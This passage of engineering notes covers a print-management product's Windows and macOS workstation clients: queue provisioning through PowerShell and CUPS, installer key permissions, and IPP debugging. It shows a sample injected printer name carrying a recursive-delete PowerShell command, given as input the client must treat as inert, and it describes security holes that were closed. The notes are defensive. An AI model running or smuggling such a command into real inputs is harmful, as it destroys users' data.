  is left — read it as both, not as outstanding work alone.

**Why the macOS half sits better, precisely.** Its CUPS logic *is* verified against
a real scheduler: `scripts/macos_cups_testbed.sh` stands up a throwaway `cupsd` on
any Linux box and `scripts/macos_provision_check.py` drives the backend through it
(54 checks). That found **six shipped defects** the unit tests had all passed over,
the required end-to-end smoke found a **seventh**, and fixing the third
*introduced* the seventh — see the conventions above. Two of them made the assigned
default printer impossible in different ways, and two were the tier-1 bug in CUPS
clothing (a queue that exists, lists, converges clean and cannot print), which with
the original Windows one made three times this codebase had shipped that exact
failure — and the real-spooler run below makes **four**. Its **`.pkg` is built by Apple's own tooling on a `macos-latest` runner**
(`.github/workflows/macos-pkg.yml`), which confirms the identifier, the payload,
the scripts and that the enrollment key's `0600` survives the round trip.

**And it has now run on a Mac**, on 2026-07-30: macOS 26.5.2, Apple Silicon,
system Python 3.9.6, no Homebrew. `installer -pkg` of a locally-built `.pkg`,
launchd loading the daemon as root, `/dev/console` and `dscl` exercised, a queue
created by that daemon from a live IPP query, and the console user's default set
by root through `sudo -u` — verified by the write landing in the *user's*
`~/.cups/lpoptions` rather than root's. Gatekeeper **refuses** the unsigned build
(`spctl` → `rejected, no usable signature`), which was the first thing worth
confirming and is now confirmed.

That run found an **eighth** defect, and it is the archetype of "only an install
could see this": `ensure_enrolled` was called *above* `run()`'s retry loop, so the
documented contract — transport failures are retried, not fatal — held for every
poll and failed at enrollment, which is exactly when a freshly imaged machine has
no network. An unresolvable central killed the process, launchd respawned it every
60s, and the log grew **9.8 MB/day** of tracebacks naming no reason. Moving the
call inside the loop costs nothing (once enrolled it makes no request) and drops
that to ~44 KB/day of one stated line per interval. A refused *key* still
re-raises, because terminal is not transient. That left a trap, now **closed**:
`workstation_cli` returns exit 2 for a refused key specifically so a service
manager will not loop — but the plist's `KeepAlive{SuccessfulExit=false}` restarts
on any non-zero exit, and launchd cannot express "restart unless the exit code is
2", so the comment described a behaviour that did not happen. Resolved with a
**refused-key sentinel** rather than by weakening the exit code: the first
refusal still exits 2 and records a SHA-256 of the key (never the key) beside
`machine.json`; a second start carrying that same key logs the reason and exits
0, so launchd restarts exactly once and stops. It clears itself when the key
changes — re-minting is the actual fix, so the fix is the reset and no operator
need know the file exists — and expires after 6h so a key central *un-revokes*
server-side is not permanently poisoned by an unchanged fingerprint. A corrupt
sentinel fails open, and `--once` neither reads nor writes it, because a
diagnostic run must give the real answer rather than a cached one. Our half is
unit-tested; **launchd's half is not, and needs the Mac** — a restart gets
counted, not inferred (`deploy/HARDWARE-VERIFICATION.md` Part 3).

**And a page came out**, which is the one item nothing else substitutes for: a
Brother MFC-L8900CDW, on a queue the root daemon provisioned, with a PPD CUPS
generated from that device's own IPP attributes. What makes it evidence rather
than a green log line is that the device's **real supply telemetry came back
through the queue while it printed** (`marker-levels=0,20,20,20`,
`toner-low-warning`) — a loopback or synthetic queue cannot produce that — and the
paper was confirmed by hand. So the tier-1 failure this codebase has now shipped
four times (a queue that exists, lists, converges clean and cannot print) is
excluded **on macOS** by observation rather than by inference — which is exactly
what has not yet been achieved on Windows.

What is **still** unverified: a non-English system locale, fast user switching,
the login-window case, a directory-bound (AD/Entra) Mac, MDM interaction,
notarization (needs a Developer ID certificate), Intel hardware, and the
vendor-driver `pkg` shape with `allow_macos_pkg_install` enabled.
`deploy/MACOS-CLIENT-TESTING.md` tracks the list, with the done items marked and
dated.

**And the Windows half has now run on real hardware**, on 2026-07-30: Windows 11
ARM64 under x64 emulation (the bundled runtime is `python-3.12.10-embed-amd64`
and there is no ARM64 build), installed with `msiexec /qn`, the service enrolling
and polling as LocalSystem under NSSM in **session 0** — the context nothing else
reaches, and the reason all three of these were invisible until now:

- **The assigned default printer had never once applied.** The write to
  `LegacyDefaultPrinterMode` went through `HKEY_CURRENT_USER` on the stated
  assumption that impersonation redirects it; HKCU resolves against the
  **process** token, so in a session-0 service it never leaves SYSTEM's hive. It
  raised `[WinError 5]`, and because that write runs *before* `SetDefaultPrinter`
  it took the entire feature down with the shipped setting ON. Fixed with
  `RegOpenCurrentUser`, which follows the *thread* token. The identical call
  **succeeds outside the service**, which is precisely why no amount of testing
  short of a real install could reach it. It is the same defect as the macOS one
  where the assigned default had never once worked, arrived at by a completely
  different road.
- **A queue that passes every check and cannot print** — the **fourth** instance,
  on the `-IppURL` path that was meant to have ended it, and this time
  `windows_provision_check.py` had passed against that exact printer minutes
  earlier. Half of it was ours and is fixed: the disproof was reading a *label*
  rather than the transport (`Description = "IPP Port"` while
  `PortMonitor = "WSD Port Monitor"`). The rest is **open** — see below.
- **The MSI shipped the enrollment key world-readable.** It set no ACL at all, so
  `icacls` reported `BUILTIN\Users:(I)(RX)` on the file the key was moved into
  *precisely because* a service command line is readable by any logged-in user.
  Fixed with a post-processed `LockPermissions` table (SYSTEM + Administrators
  only); the sibling `install-agent.ps1` had done this correctly all along.

**The open one, stated plainly**, because it is the most important thing on this
page that is not yet true: a Brother MFC-L8900CDW that the probe marks
`driverless` accepts a job and discards it in the print processor
(`0x80004005`, no `id=307`) while reporting `PrinterStatus=Normal` — and the same
device prints from CUPS over the same IPP endpoint, and from the same Windows box
over raw 9100. **Three** explanations have been proposed and all three tested and
killed: the routed hop, a missing `application/pdf`, and `ipp-features-supported`.
`scripts/ipp_replay.py` is what killed them — capture a device's real
`Get-Printer-Attributes`, replay it byte-for-byte, change exactly one attribute,
so a behaviour change is attributable to that attribute and nothing else. What it
has established is worth more than the hypotheses it disposed of: the failure is
**fully determined by what the device advertises** (importing 78 non-identity
attributes from a working device makes it print), and Windows fails while
**rendering**, before it ever contacts the device — so a probe *could* predict
this. But it is a combination, neither half of those 78 suffices, and the
responsible attributes are **not identified**. The `driverless` criterion is
therefore **deliberately unchanged**: tightening it on the leading hunch would
have downgraded every working AirPrint-only printer to `driver_required` — vendor
package or skip — for no benefit whatsoever. And before trusting any result from
that harness, read its guards: three separate harness bugs each produced a
confident wrong answer first, and one of them invalidated a whole bisect.

**"Neither half suffices" is a halt condition, not a partial result**, which is
why that search stalled and what `scripts/ipp_bisect.py` exists to fix. Binary
search recurses into whichever half still shows the effect; when *both* halves
come back negative it has nowhere to go — and both halves coming back negative is
the definition of an **interaction**, which is exactly what the evidence says is
there. So the search was not merely unfinished, it was being run with an algorithm
that cannot converge on it. The one that can is **delta debugging** (`ddmin`):
when no subset passes it tests the complements, and when those fail it refines the
partition rather than stopping, returning a **1-minimal** set. The driver decides
nothing itself — it cannot render a page — so every verdict comes from an
**oracle** the operator supplies against the real rig; everything above that seam
is unit-tested, including a test that a bisect halts on this input shape and ddmin
does not. Measured cost: **~38 physical print jobs** for a two-attribute cause
(p90 44), ~70 for three, memoised and journalled so an interrupted run resumes.
Two design points that are load-bearing rather than tidy: it **checks the premise
first** (importing everything must print, importing nothing must not — if some
donor attribute *breaks* the effect, the whole search is measuring something else,
and one trial says so instead of three hours), and `INDETERMINATE` is a **third
outcome that stops the run**, never a FAIL — coercing "the job hadn't finished
yet" into evidence of absence is precisely what invalidated the earlier attempt,
so a trial the client never queried (`QUERIES: 0`) is forced inconclusive however
it voted. The oracle itself is deliberately **not** in the repo: it spans two
machines and the Windows access path is site-specific, so any version here would
be a claim that had never run.

**Print management** (the Printix-shaped half, feature-complete): end users,
groups, and per-user / per-group printer assignment with a deterministic
resolver, at `/manage/people`; **directory sync** from Entra ID, Google
Workspace and on-prem AD, per client, credentials encrypted at rest, worker-
scheduled (`directory.sync_interval_min`) with a synchronous "Sync now".
**Machines** (`/manage/machines`) are workstations, tenant-scoped and identified
by a client-minted GUID rather than the computer name — names are reused, are not
unique across clients, and change on rename, so a rename would fork a machine and
a recycled name would inherit another's printers. Precedence is **direct user >
machine > group**, with a per-machine `default_wins` for shared terminals.

A GUID does not survive a re-image, so **`services.adopt_by_name` handles the
returning PC** (`workstation.adopt_by_name`, on by default): an enrolling machine
whose computer name matches exactly one stale record for that client takes that
record over, keeping its assignments — the row id is what assignments hang off,
so preserving the row *is* preserving the printers. The decision lives on the
server because only central can see the whole tenant; a client knows just itself
and would have to guess. Name matching is weaker than GUID matching, so each way
it can be wrong is refused rather than resolved: **tenant-scoped always**,
**exactly one candidate or none** (ambiguity is a coin flip that could hand one
person's printers to another), **the record must look gone** — a recent check-in
means the PC is alive, so a name match is a collision, and adopting it would
rotate a working machine's credential out from under it and the two would fight
over the row forever — and **blank names never match**. Adoption is audited as
`machine.adopt`, distinct from `machine.reenroll`. It does change what holding an
enrollment key gets you: a holder who names their machine after a stale record
inherits its printers, where enrollment alone previously granted nothing. That is
the trade the setting exists to let an operator decline.

The workstation client runs on **Windows and macOS from one codebase**, and the
seam is narrow on purpose: `workstation_service.py` mints the machine GUID,
enrolls against a client-scoped key (`workstation_enroll_keys`, revocable, mints
a per-machine credential), polls `/api/v1/workstations/{id}/assignments`,
converges queues through the platform backend, and checks in. Entry point
`printer-nanny-workstation` on both. Only three things are genuinely OS-specific
— where state lives, who is at the console, and how a queue and a user's default
printer are made — so those live in `platforms/` and everything else is shared. A
second macOS client would have duplicated enrollment, adoption, the
verify-then-report rule and every skip reason, and per this repo's own lesson the
duplicate is the one that drifts. On macOS the daemon is a **LaunchDaemon**, not a
LaunchAgent: `lpadmin` needs root, queues are machine-wide, the machine's
credential must not be readable by the user whose printers it manages, and the
client has to be able to become whoever is at the console *now* (after a fast user
switch) to set their default. The site agent's plist next door is correctly a
LaunchAgent — it only reads SNMP.

macOS **does** stage vendor drivers, by binding a **PPD** — one an MDM already
installed (`system`), one extracted from an uploaded archive (`ppd`), or one a
vendor `.pkg` installs when an operator has opted in (`pkg`, default off). No
Windows driver archive is ever downloaded onto a platform that cannot stage it.
The details, and the seventh instance of this codebase's recurring failure, are in
the conventions above.

It also ships as a **`.pkg`**, built from a per-client bundle central assembles
(`central/pkg_builder.py`) plus `scripts/build-macos-pkg.sh` run on a Mac. The
split is not a shortcut — `pkgbuild`, `productsign` and `notarytool` are
macOS-only, notarytool is a closed binary talking to an Apple service, and signing
needs the operator's own Developer ID certificate — so a Mac is required whatever
central does, and central therefore does the part only it can: mint the key and
assemble the payload. Three things about that worth not rediscovering. **Signing
and notarization are different**, and Gatekeeper on 10.15+ needs both, so
signed-but-unnotarized is still refused. **Stapling** is what makes the ticket work
offline, and without it a Mac that cannot reach Apple refuses a perfectly notarized
package — which describes a segmented client VLAN, i.e. exactly where these
install. And an **unsigned** build is genuinely useful (an MDM push installs it)
but is not double-clickable, so the script says so rather than letting an operator
find out from a customer; it asks `spctl` whether Gatekeeper accepts the result
rather than treating a successful `productsign` as evidence.

The payload uses the **Mac's own Python** with a bundled wheelhouse installed
`--no-index`, not a bundled interpreter: a relocatable macOS framework build is a
project of its own. That only holds because every dependency is `py3-none-any` —
the builder refuses otherwise and a test asserts it, since a C-extension
dependency would install on the Linux build host and fail on the Mac.
`.github/workflows/macos-pkg.yml` is the only automated coverage `pkgbuild` has,
and its signing gate reads a **job-level** env var, because a step's own `env:` is
not visible to that step's `if` — testing it there is always false, so signing
would silently never run.

The per-client Windows **MSI** is built from the Machines
page: `msi_builder.build_workstation_msi` shares the agent's runtime cache and
differs only by a `ProductProfile` — **a distinct UpgradeCode, service name and
install directory, because Windows treats a shared UpgradeCode as the same
product and installing one would silently uninstall the other** (an MSP's own
server legitimately runs both). Each build **mints its own enrollment key**:
keys are SHA-256 at rest so an existing one cannot be read back, and per-build
keys mean a leaked installer is revoked without touching any other. The key
travels in `workstation.toml`, never in `AppParameters` — **a service's command
line is readable by any logged-in user**. The macOS installer lands on the same
rule from the other direction: a LaunchDaemon's `ProgramArguments` and
`EnvironmentVariables` are readable by any local user via `launchctl print`, and
launchd *requires* the plist to be world-readable, so the key lives in a 0600
`workstation.toml` and only its path is in the plist.
`tests/test_macos_deployment.py` asserts that against both the reviewable plist
and the one the installer generates, since they are two files and only one ships.

**On Windows that rule was only half-applied, and the missing half undid it —
now fixed; the paragraph below is the diagnosis, not the current state.**
Verified on a real install 2026-07-30: the MSI lays `workstation.toml` down in
`C:\Program Files\Printer Nanny\Workstation\` and sets **no ACL at all** — no
`LockPermissions`, no `MsiLockPermissionsEx`, no custom action, and
`msi_builder.py` has no permission handling of any kind. `icacls` on the installed
file reports `BUILTIN\Users:(I)(RX)` — inherited from Program Files — plus
`ALL APPLICATION PACKAGES:(I)(RX)`. So the enrollment key is moved off the command
line, where any logged-in user could read it, into a file **any logged-in user can
also read**. The same holds for the agent MSI, whose `config.toml` carries an API
key or claim code to the same tree. The correct code already exists in the sibling
installer: `deploy/install-agent.ps1` calls `SetAccessRuleProtection($true,$false)`
and restricts to SYSTEM + Administrators, commented "api_key is a secret" — the MSI
path never got it, and macOS enforces the equivalent with 0700/0600.

**Fixed** by importing a `LockPermissions` table into the finished package with
`msibuild -i`. It has to happen *after* wixl because wixl rejects WiX's
`<Permission>` element outright (`unhandled child File node Permission`), so the
ACL cannot be declared in the source we compile. The table grants **SYSTEM +
Administrators only**, and because `LockPermissions` *replaces* the ACL rather
than adding to it, leaving `Users` out is what actually removes them. Verified on
a real install: `icacls` now reports exactly `NT AUTHORITY\SYSTEM:(OI)(CI)(F)`
and `BUILTIN\Administrators:(OI)(CI)(F)`, inheritance broken, and the service
still starts — LocalSystem must read its own config, which is why SYSTEM is on
the list and not Administrators alone. Two guards came with it: `msibuild` is a
declared build requirement (`msi_build_available` probes it) rather than
something discovered at the end of a multi-minute build, and an import that
reports success without landing the table is **fatal** — `msibuild` exiting 0 is
not evidence, which is the rule the PowerShell runner already learned.

A build that fails rolls the key back,
since a key minted for an installer that never existed is a live credential
nobody holds. As of **2026-07-30 it HAS run against a real spooler**: the MSI was
built, installed with `msiexec /qn` on Windows 11 (ARM64, under x64 emulation —
the bundled runtime is `python-3.12.10-embed-amd64` and there is no ARM64 build),
the service enrolled as LocalSystem, `scripts/windows_provision_check.py` passed
against a real Brother (port `WSD-…` that Windows chose, monitor **not** Standard
TCP/IP, inbox IPP class driver), and the service provisioned a queue that
converged. That run found the **default-printer defect** below. Everything above
`PowerShellRunner` still uses a fake in CI, which is the blindness that let
tier 1 ship broken. It **sets the user's default printer** by impersonating the
console session (`WTSQueryUserToken` → `ImpersonateLoggedOnUser` → Win32
`SetDefaultPrinter`,
which acts on the calling thread's user) rather than hand-assembling the
`Device` registry value, whose `Name,Driver,Port` needs a port Windows chose for
an IPP queue — a guess there yields a default that looks set and does not work.
Two things keep it honest: it **reads the default back** and only reports success
when the read agrees (`SetDefaultPrinter` returning non-zero is not evidence),
and it addresses **"Let Windows manage my default printer"**, which ships ON and
silently re-points the default at whatever was printed to last — without turning
that off an assigned default appears to apply and then quietly does not. Turning
it off overrides a user-facing preference, so it is a setting
(`workstation.manage_default_printer`, sent per poll so an operator can change
their mind without reinstalling) and the outcome is reported per machine. A
default is **never** pointed at a queue that was skipped or errored.

**And that write is where the feature was broken, for as long as it existed.**
`_stop_windows_managing_default` wrote `LegacyDefaultPrinterMode` through
`HKEY_CURRENT_USER` "while impersonating, so it lands in that user's hive" — but
HKCU resolves against the **process** token, not the thread's, so in a session-0
service running as LocalSystem it never leaves SYSTEM's hive. Under NSSM on a real
Windows 11 machine it raised `[WinError 5] Access is denied`, and because the
write runs *before* `SetDefaultPrinter` it took the whole feature down: with the
shipped default (that setting is ON) an assigned default **never applied at
all**. Isolated by flipping `manage_default_printer` off, which made the same poll
succeed. `RegOpenCurrentUser` resolves the **thread** token's hive and fixes it —
verified in the service context, with `LegacyDefaultPrinterMode=1` landing in the
console user's hive where it had stayed 0. Two traps worth keeping: the identical
call **succeeds outside the service**, so only the service context reaches it; and
reading the result back with a tool running as SYSTEM reads SYSTEM's default, not
the user's — check `HKEY_USERS\<sid>\…\Windows\Device` instead. That is the same
"verify as the right user" rule the macOS backend documents, learned again from
the other side. It **does** stage vendor drivers:
an admin uploads a package on the Machines page and the client downloads it,
**re-verifies its SHA-256 before unpacking anything**, extracts it refusing any
entry that escapes the target directory, and stages it with `pnputil` as
LocalSystem. That is deliberate fleet-wide code execution — which is what driver
installation *is* — so upload is manager-only and audited with the digest, the
download is scoped to the requesting machine's own client (a foreign package id
is a plain 404, not a 403, so it can't be used to probe), packages are cached by
digest rather than id, and a package that will not fetch, verify or unpack
becomes a **skip with a stated reason** rather than a wrong-driver bind. Matching
is a case-insensitive substring of `printers.model` (SNMP strings vary), longest
tag wins, minimum 3 characters, and an equal tie is **refused rather than
guessed**. The bytes live on a volume (`central/driver_store.py`) not in the
database, so `pg_dump` backups stay small — the trade, surfaced in the UI rather
than left to be discovered, is that **a database restore does not bring driver
packages back**. The providers are unit-tested against mocked
transports, **not** against real tenants.
- **The workstation client never interpolates a value into PowerShell.** Printer
  names, locations and comments come from devices on customer LANs and from
  operator free-text; a queue named `x"; Remove-Item -Recurse C:\ #` must be
  inert. So the scripts in `workstation.py` are **constant strings** and every
  value travels as an environment variable read as `$env:PN_*`. That makes the
  injection question moot rather than merely handled — there is no quoting to
  get wrong. A test asserts the script bodies contain no format placeholders,
  and the Windows job proves a hostile value comes back as literal text.
- **Scripts reach PowerShell as `-EncodedCommand`, and stdin is not an
  alternative.** `powershell -Command -` parses stdin **line by line**, so any
  construct spanning lines (`if (…) {`, `try {`) is incomplete on its first line
  and the remainder is discarded — silently, with **exit 0** and empty output.
  This cost two Windows CI rounds. First `_SCRIPT_ADD_TCP_PORT` lost its `if`
  body, so the port was never created and the `Add-Printer` that followed had no
  port to bind; then the try/catch wrapper added to catch *that* was itself
  multi-line and made every call return `''` — a deliberate `throw` stopped
  raising. So the script is base64 UTF-16LE in a single argv element, which
  removes the command-line parser from the path entirely; newlines, quotes and
  braces survive exactly. Only our own constants are encoded — caller values
  still travel by environment, so this narrows the injection surface rather than
  widening it. `tests/test_workstation_queue.py` round-trips every `_SCRIPT_*`
  byte for byte and asserts some of them still span lines, so stdin cannot come
  back as a "simplification".
- **PowerShell exits 0 when a cmdlet throws**, including under
  `$ErrorActionPreference = 'Stop'`. Trusting `returncode` meant a failed
  `Add-Printer` was reported as success and the caller recorded "created" for a
  queue that does not exist — on a workstation, central showing printers as
  provisioned while the user has nothing to print to, with no error anywhere. So
  the wrapper carries an explicit `exit 1` **and** a stdout failure marker, plus
  a `$LASTEXITCODE` check because a native command (`pnputil`) that fails does
  not throw. A fake runner returns what it is told, so no amount of unit testing
  above the seam can find this class of defect — only the Windows job can.
- **Tier 1 hands Windows a URL; it never builds the port itself — and this was
  wrong for as long as it existed.** `Add-PrinterPort` has exactly four
  parameter sets (`local`, `tcp`, `tcplpr`, `lpr`) and **none creates an IPP
  port**: the Standard TCP/IP monitor speaks only RAW or LPR on 9100. The
  original tier 1 derived a port name from the IPP URL, made a port with
  `-PrinterHostAddress ipp://…`, and bound the class driver to it — producing a
  queue that was created, listed by `Get-Printer`, passed every convergence
  check, and **could not print**. Exactly the "central shows provisioned while
  the user has nothing to print to" failure this codebase says must never happen.
  The supported call is `Add-Printer -IppURL`, whose parameter set is *disjoint*
  from `-DriverName`/`-PortName` — so this was the wrong cmdlet shape, not a bad
  argument. Windows runs the IPP query, picks the driver and names the port.
  Proven on real hardware 2026-07-28: a Brother NIC came back on port
  `WSD-<guid>` with monitor **`IPP Port`** — neither of which `Add-PrinterPort`
  can produce, which is what makes the old path's failure a fact rather than a
  theory. Consequences that must not be undone: tier 1 does **not** share
  `_converge` (Windows owns the port name, so a derived name never matches and
  every poll would re-provision); a converged queue costs **no** network round
  trip (`-IppURL` is a live query and this runs on every poll, so re-querying
  would fail queues whose printer is merely asleep); a queue found on the
  Standard TCP/IP monitor is **rebuilt**, which is the migration path for queues
  the old code left behind; and landing on that monitor is an **error, never
  "created"**. There is deliberately no fallback — falling back is what produced
  the silent breakage. `-IppURL` is documented for Server 2022/2025 and **absent
  on 2019**, so tier 1 probes for it and refuses outright when missing. (The
  Server 2016→2025 matrix elsewhere is about the *site agent* MSI, which is an
  SNMP poller and never touches this path.)
- **A fourth instance, and the check itself did not catch it (2026-07-30).** The
  MSI was installed on real Windows 11 and the service provisioned a queue
  against a real Brother. `windows_provision_check.py` **passed** — port not
  derived, monitor not Standard TCP/IP, inbox IPP class driver, second pass a
  no-op — and the queue **could not print**. `PrintService/Operational` (off by
  default, so enable it before believing a queue works) recorded
  `id=842 … Win32 error code returned by the print processor: 0x80004005` and
  **no `id=307` "Document printed"**. The job spooled, failed, and was discarded
  while `PrinterStatus=Normal`, `DetectedErrorState=0`, zero jobs pending. Raw
  bytes to the same device on TCP/9100 from the same VM printed fine, so the
  device and the network path were never in question. Two things made it
  invisible:
  - **The disproof was reading a label, not the transport.** `port_detail`
    returned only `Description`, and on a `-IppURL` queue `Description = "IPP
    Port"` while `PortMonitor = "WSD Port Monitor"`. Both the client and the
    check asserted against the description, so any non-Standard-TCP/IP *string*
    passed. Now fixed: `port_transport()` prefers the monitor, and the check
    prints description, monitor and host address separately.
  - **The port is identity-addressed, not address-addressed** — its registry
    entry is `Printer UUID = e3248000-…`, `Install Protocol = 1`, and an empty
    `PrinterHostAddress`. That is a real and surprising property of an
    `-IppURL` queue, **but it is NOT why this one could not print.** The first
    reading of this defect blamed it, reasoning that a UUID must be re-resolved
    by link-local discovery and so could not survive a routed hop. That was
    tested afterwards and is **wrong** — see the experiments in
    `deploy/WINDOWS-MSI-TESTING.md`. `-IppURL` prints across a routed hop
    perfectly well, and Windows negotiates the document format correctly. What
    actually fails is this **specific device**: the queue is created, reports
    healthy, and the job dies in the print processor, while the very same device
    prints from CUPS over the same IPP endpoint and from the same Windows box
    over raw 9100. The lesson that survives is the one below, not a theory about
    routing. `scripts/ipp_replay.py` exists to settle this class of question:
    capture a device's real Get-Printer-Attributes response, replay it
    byte-for-byte, change one attribute. An early pass appeared to exclude
    `ipp-features-supported`; **that is withdrawn** -- it used a fixed 30s wait
    that manufactures false negatives, so it proved nothing either way. What a
    *verified* harness does show: the Brother's captured attributes reproduce the
    failure 3/3 with the client demonstrably querying the replay, and importing
    all 78 non-identity attributes from a working device makes it print. So the
    failure is determined by what the device advertises, and Windows fails while
    **rendering** before it contacts the device -- the signal a probe would need
    is already in data the probe has. It is a *combination*, though: neither half
    of those 78 suffices, and the responsible attributes are **not identified**.
    The `driverless` criterion is therefore unchanged. Three separate harness
    bugs each produced confident wrong answers here (a fixed wait, a port that
    never freed so the previous config kept serving, and a verdict from a run
    where the client never queried us) -- the guards are documented in the
    script, and a result obtained without them is worthless.
    `scripts/ipp_bisect.py` drives the remaining search with those guards
    enforced in code rather than by memory, using **delta debugging** rather
    than a bisect, because "neither half suffices" is the input on which a
    bisect halts. See the Status section and `deploy/WINDOWS-MSI-TESTING.md`.
  The general lesson, for the fourth time: a queue that exists, lists and
  converges is not a queue that prints, and every proxy for "it works" that does
  not involve paper has now failed at least once. **The only sufficient check is
  a printed page**, and `windows_provision_check.py` says so but cannot do it.
- **Nothing above the seam could have caught that.** `tests/windows/` never
  called `ensure_driverless_queue` — all 15 spooler tests drove `_converge` with
  `port_name_for("127.0.0.1")` and a local driver, so an `ipp://` URI never once
  reached `Add-PrinterPort` on a real machine, and binding an inbox driver to a
  loopback TCP port succeeds whether or not printing would work. The job was
  green and blind simultaneously. What closed it was
  `scripts/windows_provision_check.py`, run by hand against a real printer:
  `Get-Printer` returning the queue proves nothing, so it asserts the port name
  is **not** one we derived, the monitor is **not** Standard TCP/IP, and the
  driver is the inbox one. Any future claim that driverless printing works needs
  that check, not a green CI run.
- **The macOS backend repeated the lesson exactly, and paid for it four times.**
  `tests/test_workstation_macos.py` (81 tests) was green while every one of these
  shipped; all four were found by `scripts/macos_provision_check.py` against a
  live `cupsd`, and by nothing else. None of them is a macOS quirk — each is a
  general failure mode wearing CUPS clothing, which is why they are here:
  - **`lpoptions -d` with no destination is a usage error, not a read** (exit 1,
    prints usage). So the read-back always returned `None` and
    `set_default_printer` *always* raised "default did not stick" — the assigned
    default had **never once worked**. The read is `lpstat -d`. A *successful*
    `lpoptions -d NAME` prints the queue's whole option list, so parsing its
    output for a name yields `copies=1`. The general lesson: a verify-then-report
    rule is only as good as the read, and a read that can only fail makes the
    whole mechanism report failure forever rather than loudly break.
  - **Every string CUPS prints is translated.** `lpstat -p` on a German Mac reads
    `Drucker X ist im Leerlauf`, so enumeration matched nothing: every poll
    re-created every queue — a live IPP query per printer per poll, the exact
    round trip the code promises not to make — and no stale queue was ever
    removed. Fixed by forcing `LC_ALL=C` on **every** command, which has to
    travel through `sudo` as an explicit `/usr/bin/env` because sudo scrubs the
    environment, and by enumerating with `lpstat -v` (name *and* URI in one call;
    deliberately not `lpstat -e`, which also lists DNS-SD-discovered printers, so
    every Bonjour printer on the subnet would look like an existing queue).
  - **`cupsd` commits `device-uri` and *then* runs the `-m everywhere` query.** A
    repair against an unreachable printer therefore exited 1 having already moved
    the queue and generated no PPD — a queue that exists, is listed, matches what
    central wants, converges as "unchanged" **forever**, and cannot print. The
    macOS spelling of the tier-1 bug above. A failed change is now unwound
    completely, per the updater's contract: a failed *repair* restores the
    previous URI (a `-v`-only `lpadmin` is instant, needs no network, and leaves
    the PPD byte-identical — measured), a failed *create* removes the carcass.
    Rejected alternative: probing `printer-make-and-model` for `Local Raw
    Printer`, which depends on an undocumented server-side string.
  - **An unreachable printer costs 30s, and our timeout must not collide with
    the tool's.** A single 30s bound matched `cupsd`'s own connect timeout, so
    the failure surfaced as our useless "timed out" instead of `lpadmin`'s message
    naming the address. Live queries now carry a larger timeout than the thing
    they wrap, and a whole pass is bounded by `_QUERY_BUDGET` (under half the
    300s poll interval) so a rack of sleeping printers cannot outlast a cycle.
    What the budget skips it **says** — a queue silently absent from the outcomes
    reads to central as a queue that was never assigned.
  - **A seventh, and the same failure yet again: an unwind that cannot unwind.**
    Vendor drivers on macOS mean binding a PPD, and `lpadmin -p N -v URI -P bad.ppd`
    exits **0** — it has already replaced the queue's PPD by the time cupsd's
    verdict exists. So the first version restored the *URI* on failure and left the
    queue on its old address carrying the new **broken** PPD: right URI, so it
    converges as "unchanged" forever; broken PPD, so it cannot print. Tier 1, a
    third time, reintroduced *by the fix for the second time*. Caught by the
    live-scheduler check and nothing else. A PPD is now tried on a throwaway probe
    queue first (a local bind, ~13ms, no network) and the real queue is touched
    only once it is proven — so a failure changes nothing because nothing was
    done. Rejected: snapshotting `/etc/cups/ppd/NAME.ppd` to restore later, which
    works but makes a *correctness* path depend on a CUPS-internal file location.
    The general rule: **if a failed operation cannot be undone, do not start it —
    test it somewhere disposable.**
  - One more, found the same way: **a prefix is not a name.** `cups_queue_name`
    strips trailing underscores, so the shipped `MANAGED_PREFIX = "PN "`
    sanitised to `"PN"` — which matches a user's own `PNMyPrinter` and would
    delete it, the precise failure the prefix exists to prevent.
    `cups_queue_prefix` keeps the separator.
- **A report must use one name per printer, and the backend owns that name.** A
  sixth defect, and the *end-to-end smoke* is what caught it — not the real-CUPS
  check, because it lives above `_run`. `build_specs` names queues for Windows,
  which accepts them verbatim; CUPS rejects spaces, so the macOS backend derives
  its own and keys `outcomes` by that. `skipped` and `desired_default` still
  carried the Windows spelling, so `outcomes.get(desired_default)` in `provision`
  **missed every time**: on a Mac the assigned default could never be applied, and
  the reason reported was "its queue was not provisioned (skipped)" *even when the
  queue had been created perfectly* — central asserting a failure that had not
  happened, about a feature that could not work. Backends therefore expose
  `queue_name()` (identity on Windows, `cups_queue_name` on macOS) and `provision`
  normalises the whole report through it. The general rule: when a per-platform
  layer may rename a thing, the shared layer must ask it for the name rather than
  assume its own is authoritative. Nothing above the seam could see this, because
  the fake backend the unit tests use echoes the names it is handed — the same
  blind spot as tier 1, one layer up.
- **cupsd will tell you whether a driver actually works, if you ask.** Binding a
  vendor PPD whose filters are not installed is the *normal* outcome of uploading
  a PPD without the vendor's package, and it yields a queue that is created,
  listed, converged and unable to print. `printer-state-reasons` carries
  `cups-missing-filter-warning` exactly then, and is an IPP keyword list rather
  than prose so it does not translate. Verified both ways: clean for a PPD with no
  filters and for one naming a filter that exists, set for a missing `*cupsFilter`
  and a missing `*cupsFilter2`. The catch that makes this worth writing down —
  the verdict is only meaningful when the **baseline** filter set is complete. On a
  box missing CUPS's own `commandtops`, cupsd flags every queue and the check
  silently stops discriminating while still passing, so
  `scripts/macos_cups_testbed.sh` checks for it and says so.
- **macOS vendor drivers are three shapes, and the safe one needs no privilege.**
  `system` records the absolute path of a PPD an MDM already installed — zero code
  execution, and the only option that reaches a full vendor driver *with* its
  filters; it has **no bytes at all**, so it is exempt from the missing-file check
  that disqualifies a package whose payload is gone. `ppd` extracts a `.ppd` from
  an uploaded archive. `pkg` runs `installer -pkg` as root, which executes
  arbitrary pre/postinstall scripts — genuinely broader than `pnputil /add-driver`
  — so it is gated behind `workstation.allow_macos_pkg_install`, **default off**,
  a separate decision from who may upload. For `pkg` the operator names the
  *installed* PPD path (same meaning as `system`) and the installer is found in the
  archive by the unambiguous-or-refuse rule; an already-present PPD skips the
  install, without which a vendor package would be reinstalled as root every poll.
  An operator-typed system path is constrained to the directories PPDs live in and
  `realpath`d **before** the check, since `lpadmin -P` copies whatever it is handed
  into `/etc/cups/ppd` — unconstrained, that text field is "read any root-readable
  file".
- **`driver_packages.platform` is a correctness requirement, not a label.**
  Matching is by model substring, so a client holding both a Windows and a macOS
  package for one printer yields two equally-specific matches — which the
  ambiguity rule correctly refuses, meaning **adding macOS support would have
  silently stopped the Windows staging that already worked.** Platform scopes the
  candidates before specificity is compared. The machine's platform travels on
  each assignments request rather than being read from `machines.platform`: a
  stored value goes stale when a PC is re-imaged as a Mac and keeps its row through
  adoption, and a stale platform hands a Mac a Windows driver archive. The column
  exists for the UI and is written by **check-in**, not by the assignments GET — a
  read path that writes is both a surprise and a commit per poll.
- **`scripts/macos_cups_testbed.sh` makes that verification reproducible without
